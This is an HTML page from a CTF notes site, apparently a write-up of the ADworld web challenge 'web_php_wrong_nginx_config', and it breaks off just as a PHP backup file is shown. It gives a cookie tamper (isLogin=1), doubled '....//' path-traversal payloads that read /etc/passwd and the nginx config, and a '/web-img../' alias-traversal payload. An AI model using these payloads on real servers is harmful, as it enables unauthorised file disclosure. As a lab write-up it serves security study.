@@ -1,0 +1,1846 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>web_php_wrong_nginx_config · Eki's CTF</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        <meta name="author" content="Eki">
+        
+        
+    
+    <link rel="stylesheet" href="../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-splitter/splitter.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-katex/katex.min.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-tbfed-pagefooter/footer.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-anchor-navigation-ex/style/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search-plus/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-multipart/multipart.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-advanced-emoji/emoji-website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-donate/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-pageview-count/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-code/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-lightbox/css/lightbox.min.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-auto-scroll-table/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-theme-comscore/test.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="web_python_template_injection.html" />
+    
+    
+    <link rel="prev" href="web_php_unserialize.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+    
+        
+        <li>
+            <a href="https://ieki.xyz" target="_blank" class="custom-link">主站 Eki's Blog</a>
+        </li>
+    
+    
+
+    
+    <li class="divider"></li>
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    About
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="../library/">
+            
+                <a href="../library/">
+            
+                    
+                    Library
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" data-path="../library/steganography.html">
+            
+                <a href="../library/steganography.html">
+            
+                    
+                    Steganography
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" data-path="../library/gdb-tutorial.html">
+            
+                <a href="../library/gdb-tutorial.html">
+            
+                    
+                    GDB Tutorial
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3" data-path="../library/sqli.html">
+            
+                <a href="../library/sqli.html">
+            
+                    
+                    SQL Inject
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4" >
+            
+                <span>
+            
+                    
+                    PHP
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.4.1" data-path="../library/php/function.html">
+            
+                <a href="../library/php/function.html">
+            
+                    
+                    Functions
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.2" data-path="../library/php/protocol.html">
+            
+                <a href="../library/php/protocol.html">
+            
+                    
+                    Protocol
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.3" data-path="../library/php/ace.html">
+            
+                <a href="../library/php/ace.html">
+            
+                    
+                    ACE
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.4" data-path="../library/php/serialize.html">
+            
+                <a href="../library/php/serialize.html">
+            
+                    
+                    Serialize
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.5" data-path="../library/php/misc.html">
+            
+                <a href="../library/php/misc.html">
+            
+                    
+                    Misc
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5" data-path="../library/htaccess.html">
+            
+                <a href="../library/htaccess.html">
+            
+                    
+                    Apache .htaccess
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6" data-path="../library/ssti.html">
+            
+                <a href="../library/ssti.html">
+            
+                    
+                    SSTI
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.7" data-path="../library/ssrf.html">
+            
+                <a href="../library/ssrf.html">
+            
+                    
+                    SSRF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.8" data-path="../library/xxe.html">
+            
+                <a href="../library/xxe.html">
+            
+                    
+                    XXE
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.9" data-path="../library/xss.html">
+            
+                <a href="../library/xss.html">
+            
+                    
+                    XSS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.10" data-path="../library/shell.html">
+            
+                <a href="../library/shell.html">
+            
+                    
+                    Shell
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.11" data-path="../library/crypto.html">
+            
+                <a href="../library/crypto.html">
+            
+                    
+                    Crypto
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.12" data-path="../library/js.html">
+            
+                <a href="../library/js.html">
+            
+                    
+                    JavaScript
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.13" data-path="../library/python.html">
+            
+                <a href="../library/python.html">
+            
+                    
+                    Python
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.14" data-path="../library/bash.html">
+            
+                <a href="../library/bash.html">
+            
+                    
+                    BASH
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.15" data-path="../library/forensics.html">
+            
+                <a href="../library/forensics.html">
+            
+                    
+                    Forensics
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.16" data-path="../library/pentest.html">
+            
+                <a href="../library/pentest.html">
+            
+                    
+                    Pentest
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.17" data-path="../library/protocol.html">
+            
+                <a href="../library/protocol.html">
+            
+                    
+                    Protocol
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.18" data-path="../library/misc.html">
+            
+                <a href="../library/misc.html">
+            
+                    
+                    MISC
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.19" data-path="../library/awd.html">
+            
+                <a href="../library/awd.html">
+            
+                    
+                    AWD
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="../contest/">
+            
+                <a href="../contest/">
+            
+                    
+                    Contest
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" data-path="../contest/hfctf-2021.html">
+            
+                <a href="../contest/hfctf-2021.html">
+            
+                    
+                    2021数字中国创新大赛虎符网络安全赛
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" data-path="../contest/hackergame-2019.html">
+            
+                <a href="../contest/hackergame-2019.html">
+            
+                    
+                    Hackergame 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3" data-path="../contest/tsctf-j2019.html">
+            
+                <a href="../contest/tsctf-j2019.html">
+            
+                    
+                    TSCTF-J 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4" data-path="../contest/nctf2019.html">
+            
+                <a href="../contest/nctf2019.html">
+            
+                    
+                    NCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.5" data-path="../contest/isoon-2019.html">
+            
+                <a href="../contest/isoon-2019.html">
+            
+                    
+                    ISOON 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.6" data-path="../contest/mrctf-2020.html">
+            
+                <a href="../contest/mrctf-2020.html">
+            
+                    
+                    MRCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.7" data-path="../contest/hfctf-2020.html">
+            
+                <a href="../contest/hfctf-2020.html">
+            
+                    
+                    2020数字中国创新大赛虎符网络安全赛
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.8" data-path="../contest/npuctf-2020.html">
+            
+                <a href="../contest/npuctf-2020.html">
+            
+                    
+                    NPUCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.9" data-path="../contest/gkctf-2020.html">
+            
+                <a href="../contest/gkctf-2020.html">
+            
+                    
+                    GKCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.10" data-path="../contest/sctf-2020.html">
+            
+                <a href="../contest/sctf-2020.html">
+            
+                    
+                    SCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    ADworld
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1" data-path="misc-exercise-area.html">
+            
+                <a href="misc-exercise-area.html">
+            
+                    
+                    Misc Exercise Area
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2" data-path="crypto-execrise-area.html">
+            
+                <a href="crypto-execrise-area.html">
+            
+                    
+                    Crypto Exercise Area
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3" data-path="web-execrise-area.html">
+            
+                <a href="web-execrise-area.html">
+            
+                    
+                    Web Exercise Area
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.4" data-path="pwn-exercise-area.html">
+            
+                <a href="pwn-exercise-area.html">
+            
+                    
+                    PWN Exercise Area
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.5" data-path="reverse-execrise-area.html">
+            
+                <a href="reverse-execrise-area.html">
+            
+                    
+                    Reverse Exercise Area
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.6" data-path="easy_tornado.html">
+            
+                <a href="easy_tornado.html">
+            
+                    
+                    Easy Tornado
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.7" data-path="i-got-id-200.html">
+            
+                <a href="i-got-id-200.html">
+            
+                    
+                    i-got-id-200
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.8" data-path="ics-02.html">
+            
+                <a href="ics-02.html">
+            
+                    
+                    ics-02
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.9" data-path="ics-07.html">
+            
+                <a href="ics-07.html">
+            
+                    
+                    ics-07
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.10" data-path="shrine.html">
+            
+                <a href="shrine.html">
+            
+                    
+                    shrine
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.11" data-path="super_sqli.html">
+            
+                <a href="super_sqli.html">
+            
+                    
+                    super_sqli
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.12" data-path="web_php_unserialize.html">
+            
+                <a href="web_php_unserialize.html">
+            
+                    
+                    Web_php_unserialize
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.4.13" data-path="web_php_wrong_nginx_config.html">
+            
+                <a href="web_php_wrong_nginx_config.html">
+            
+                    
+                    web_php_wrong_nginx_config
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.14" data-path="web_python_template_injection.html">
+            
+                <a href="web_python_template_injection.html">
+            
+                    
+                    Web_python_template_injection
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.15" data-path="wtf.sh-150.html">
+            
+                <a href="wtf.sh-150.html">
+            
+                    
+                    wtf.sh-150
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.16" data-path="zhuanxv.html">
+            
+                <a href="zhuanxv.html">
+            
+                    
+                    Zhuanxv
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" data-path="../buuoj/">
+            
+                <a href="../buuoj/">
+            
+                    
+                    BUUOJ
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.1" data-path="../buuoj/suctf-2019.html">
+            
+                <a href="../buuoj/suctf-2019.html">
+            
+                    
+                    SUCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2" data-path="../buuoj/ciscn-northeast-2019.html">
+            
+                <a href="../buuoj/ciscn-northeast-2019.html">
+            
+                    
+                    CISCN 2019 华北赛区
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.3" data-path="../buuoj/ciscn-pre-2019.html">
+            
+                <a href="../buuoj/ciscn-pre-2019.html">
+            
+                    
+                    CISCN 2019 初赛
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.4" data-path="../buuoj/ciscn-final-2019.html">
+            
+                <a href="../buuoj/ciscn-final-2019.html">
+            
+                    
+                    CISCN 2019 Final
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.5" data-path="../buuoj/de1ctf-2019.html">
+            
+                <a href="../buuoj/de1ctf-2019.html">
+            
+                    
+                    De1CTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.6" data-path="../buuoj/wangdingcup-2018.html">
+            
+                <a href="../buuoj/wangdingcup-2018.html">
+            
+                    
+                    网鼎杯 2018
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.7" data-path="../buuoj/wangdingcup-2019.html">
+            
+                <a href="../buuoj/wangdingcup-2019.html">
+            
+                    
+                    网鼎杯 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.8" data-path="../buuoj/roarctf-2019.html">
+            
+                <a href="../buuoj/roarctf-2019.html">
+            
+                    
+                    RoarCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.9" data-path="../buuoj/0ctf-2016.html">
+            
+                <a href="../buuoj/0ctf-2016.html">
+            
+                    
+                    0CTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.10" data-path="../buuoj/gxyctf-2019.html">
+            
+                <a href="../buuoj/gxyctf-2019.html">
+            
+                    
+                    GXYCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.11" data-path="../buuoj/hitcon-2017.html">
+            
+                <a href="../buuoj/hitcon-2017.html">
+            
+                    
+                    Hitcon 2017
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.12" data-path="../buuoj/jikedatiaozhan-2019.html">
+            
+                <a href="../buuoj/jikedatiaozhan-2019.html">
+            
+                    
+                    极客大挑战2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.13" data-path="../buuoj/lctf-2018.html">
+            
+                <a href="../buuoj/lctf-2018.html">
+            
+                    
+                    LCTF 2018
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.14" data-path="../buuoj/de1ctf-2019.html">
+            
+                <a href="../buuoj/de1ctf-2019.html">
+            
+                    
+                    De1CTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.15" data-path="../buuoj/swpu-2019.html">
+            
+                <a href="../buuoj/swpu-2019.html">
+            
+                    
+                    SWPU 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.16" data-path="../buuoj/suctf-2019.html">
+            
+                <a href="../buuoj/suctf-2019.html">
+            
+                    
+                    SUCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.17" data-path="../buuoj/bjdctf-2020.html">
+            
+                <a href="../buuoj/bjdctf-2020.html">
+            
+                    
+                    BJDCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.18" data-path="../buuoj/rctf-2015.html">
+            
+                <a href="../buuoj/rctf-2015.html">
+            
+                    
+                    RCTF 2015
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.19" data-path="../buuoj/bytectf-2019.html">
+            
+                <a href="../buuoj/bytectf-2019.html">
+            
+                    
+                    ByteCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.20" data-path="../buuoj/qiangwangbei-2019.html">
+            
+                <a href="../buuoj/qiangwangbei-2019.html">
+            
+                    
+                    强网杯 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.21" data-path="../buuoj/ddctf-2019.html">
+            
+                <a href="../buuoj/ddctf-2019.html">
+            
+                    
+                    DDCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.22" data-path="../buuoj/eis-2019.html">
+            
+                <a href="../buuoj/eis-2019.html">
+            
+                    
+                    EIS 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.23" data-path="../buuoj/vn-2020.html">
+            
+                <a href="../buuoj/vn-2020.html">
+            
+                    
+                    V&N 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.24" data-path="../buuoj/fbctf-2019.html">
+            
+                <a href="../buuoj/fbctf-2019.html">
+            
+                    
+                    FBCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.25" data-path="../buuoj/gyctf-2020.html">
+            
+                <a href="../buuoj/gyctf-2020.html">
+            
+                    
+                    GYCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.26" data-path="../buuoj/bjd-2nd.html">
+            
+                <a href="../buuoj/bjd-2nd.html">
+            
+                    
+                    BJDCTF 2nd
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.27" data-path="../buuoj/fireshellctf-2020.html">
+            
+                <a href="../buuoj/fireshellctf-2020.html">
+            
+                    
+                    FireShellCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.28" data-path="../buuoj/gyctf-2020.html">
+            
+                <a href="../buuoj/gyctf-2020.html">
+            
+                    
+                    GWCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.29" data-path="../buuoj/watevrctf-2019.html">
+            
+                <a href="../buuoj/watevrctf-2019.html">
+            
+                    
+                    WatervrCTF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.30" data-path="../buuoj/ciscn-southeast-2019.html">
+            
+                <a href="../buuoj/ciscn-southeast-2019.html">
+            
+                    
+                    CISCN2019 华东南赛区
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.31" data-path="../buuoj/bsidescf-2019.html">
+            
+                <a href="../buuoj/bsidescf-2019.html">
+            
+                    
+                    BsidesCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.32" data-path="../buuoj/rctf-2019.html">
+            
+                <a href="../buuoj/rctf-2019.html">
+            
+                    
+                    RCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6" data-path="../pwnable.kr/">
+            
+                <a href="../pwnable.kr/">
+            
+                    
+                    pwnable.kr
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.6.1" data-path="../pwnable.kr/toddlers-bottle.html">
+            
+                <a href="../pwnable.kr/toddlers-bottle.html">
+            
+                    
+                    Toddler's Bottle
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7" data-path="../ethernaut/">
+            
+                <a href="../ethernaut/">
+            
+                    
+                    Ethernaut
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8" data-path="../vulnhub/">
+            
+                <a href="../vulnhub/">
+            
+                    
+                    Vulnhub
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.8.1" data-path="../vulnhub/dc-9.html">
+            
+                <a href="../vulnhub/dc-9.html">
+            
+                    
+                    DC-9
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.2" data-path="../vulnhub/five86-1.html">
+            
+                <a href="../vulnhub/five86-1.html">
+            
+                    
+                    five86-1
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.3" data-path="../vulnhub/wakanda.html">
+            
+                <a href="../vulnhub/wakanda.html">
+            
+                    
+                    wakanda
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href=".." >web_php_wrong_nginx_config</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div class="search-plus" id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <div id="anchor-navigation-ex-navbar"><i class="fa fa-navicon"></i><ul><ul><li><span class="title-icon "></span><a href="#webphpwrongnginxconfig"><b></b>Web_php_wrong_nginx_config</a></li><ul><li><span class="title-icon "></span><a href="#&#x53C2;&#x8003;&#x8D44;&#x6599;"><b></b>&#x53C2;&#x8003;&#x8D44;&#x6599;</a></li></ul></ul></ul></div><a href="#" id="anchorNavigationExGoTop"><i class="fa fa-arrow-up"></i></a><h2 id="webphpwrongnginxconfig"><a name="webphpwrongnginxconfig" class="anchor-navigation-ex-anchor" href="#webphpwrongnginxconfig"><i class="fa fa-link" aria-hidden="true"></i></a>Web_php_wrong_nginx_config</h2>
+<p>&#x6253;&#x5F00;&#x9776;&#x673A;&#x63D0;&#x793A;&#x672A;&#x767B;&#x9646;&#x5E76;&#x8DF3;&#x8F6C;&#x5230;/login.php</p>
+<p>&#x770B;&#x4E86;&#x4E00;&#x4E0B;cookie</p>
+<pre><code>isLogin=0
+</code></pre><p>&#x6539;&#x6210;1&#x5C31;&#x53EF;&#x4EE5;&#x4E86;....</p>
+<p>&#x767B;&#x8FDB;&#x53BB;&#x4EE5;&#x540E;&#x53D1;&#x73B0;URL&#x53D8;&#x6210;&#x4E86;</p>
+<pre><code>http://111.198.29.45:42014/admin/admin.php?file=index&amp;ext=php
+</code></pre><p>&#x731C;&#x6D4B;&#x662F;&#x4E2A;LFI</p>
+<p>&#x4F46;&#x662F;fuzz&#x4E86;&#x51E0;&#x4E2A;&#x90FD;&#x4E0D;&#x884C;&#xFF0C;&#x4E5F;&#x4E0D;&#x77E5;&#x9053;&#x56DE;&#x663E;&#x5728;&#x54EA;....</p>
+<p>&#x60F3;&#x8D77;&#x6765;&#x53BB;&#x7FFB;&#x4E86;&#x7FFB;robots.txt</p>
+<p>&#x6709;&#x4E24;&#x4E2A;</p>
+<pre><code>//hint.php
+&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E5F;&#x8BB8;&#x6709;&#x95EE;&#x9898;&#x5440;&#xFF1A;/etc/nginx/sites-enabled/site.conf
+</code></pre><p>&#x63D0;&#x793A;&#x6211;&#x4EEC;&#x8981;&#x53BB;&#x8BFB;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;</p>
+<p>hack.php&#x8C8C;&#x4F3C;&#x548C;admin.php&#x91CC;&#x7684;&#x4E1C;&#x897F;&#x4E00;&#x6837;</p>
+<p>&#x6700;&#x7EC8;&#x90FD;&#x4F1A;&#x8DF3;&#x8F6C;&#x5230;</p>
+<pre><code>http://111.198.29.45:42014/admin/admin.php?file=index&amp;ext=php
+</code></pre><p>&#x8FD9;&#x91CC;fuzz&#x4E86;&#x597D;&#x4E45;.....</p>
+<p>&#x6700;&#x540E;&#x53D1;&#x73B0;&#x5E94;&#x8BE5;&#x662F;&#x8FC7;&#x6EE4;&#x4E86;../</p>
+<p>&#x7528;&#x53CC;&#x5199;&#x53D1;&#x53EF;&#x4EE5;&#x7ED5;&#x8FC7;</p>
+<pre><code>....//....//....//....//....//....//....//....//etc/passwd
+....//....//....//....//....//....//....//....//etc/nginx/sites-enabled/site.conf
+</code></pre><p>&#x62FF;&#x5230;config&#x6587;&#x4EF6;</p>
+<pre><code class="lang-nginx">server {
+    listen 8080; ## listen for ipv4; this line is default and implied
+    listen [::]:8080; ## listen for ipv6
+
+    root /var/www/html;
+    index index.php index.html index.htm;
+    port_in_redirect off;
+    server_name _;
+
+    # Make site accessible from http://localhost/
+    #server_name localhost;
+
+    # If block for setting the time for the logfile
+    if ($time_iso8601 ~ &quot;^(\d{4})-(\d{2})-(\d{2})&quot;) {
+       set $year $1;
+       set $month $2;
+       set $day $3;
+    }
+    # Disable sendfile as per https://docs.vagrantup.com/v2/synced-folders/virtualbox.html
+    sendfile off;
+
+        set $http_x_forwarded_for_filt $http_x_forwarded_for;
+        if ($http_x_forwarded_for_filt ~ ([0-9]+\.[0-9]+\.[0-9]+\.)[0-9]+) {
+                set $http_x_forwarded_for_filt $1???;
+        }
+
+    # Add stdout logging
+
+    access_log /var/log/nginx/$hostname-access-$year-$month-$day.log openshift_log;
+    error_log /var/log/nginx/error.log info;
+
+    location / {
+        # First attempt to serve request as file, then
+        # as directory, then fall back to index.html
+        try_files $uri $uri/ /index.php?q=$uri&amp;$args;
+        server_tokens off;
+    }
+
+    #error_page 404 /404.html;
+
+    # redirect server error pages to the static page /50x.html
+    #
+    error_page 500 502 503 504 /50x.html;
+    location = /50x.html {
+        root /usr/share/nginx/html;
+    }
+    location ~ \.php$ {
+        try_files $uri $uri/ /index.php?q=$uri&amp;$args;
+        fastcgi_split_path_info ^(.+\.php)(/.+)$;
+        fastcgi_pass unix:/var/run/php/php5.6-fpm.sock;
+        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
+        fastcgi_param SCRIPT_NAME $fastcgi_script_name;
+        fastcgi_index index.php;
+        include fastcgi_params;
+        fastcgi_param REMOTE_ADDR $http_x_forwarded_for;
+    }
+
+    location ~ /\. {
+            log_not_found off;
+            deny all;
+    }
+    location /web-img {
+        alias /images/;#&#x5B58;&#x5728;&#x76EE;&#x5F55;&#x7A7F;&#x8D8A;&#x95EE;&#x9898;
+        autoindex on;#&#x6B64;&#x6B21;&#x6253;&#x5F00;&#x4E86;&#x8DEF;&#x5F84;&#x6D4F;&#x89C8;
+    }
+    location ~* \.(ini|docx|pcapng|doc)$ {  
+         deny all;  
+    }  
+
+    include /var/www/nginx[.]conf;
+</code></pre>
+<pre><code>payload=http://111.198.29.45:42014/web-img../
+</code></pre><p>&#x53D1;&#x73B0;&#x6211;&#x4EEC;&#x73B0;&#x5728;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x9776;&#x673A;&#x4E0A;&#x6240;&#x6709;&#x6587;&#x4EF6;&#x4E86;</p>
+<p>&#x904D;&#x5386;&#x770B;&#x4E00;&#x4E0B;</p>
+<p>&#x5728;/var/www/&#x4E0B;&#x627E;&#x5230;&#x4E00;&#x4E2A;hack.php.bak</p>
+<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
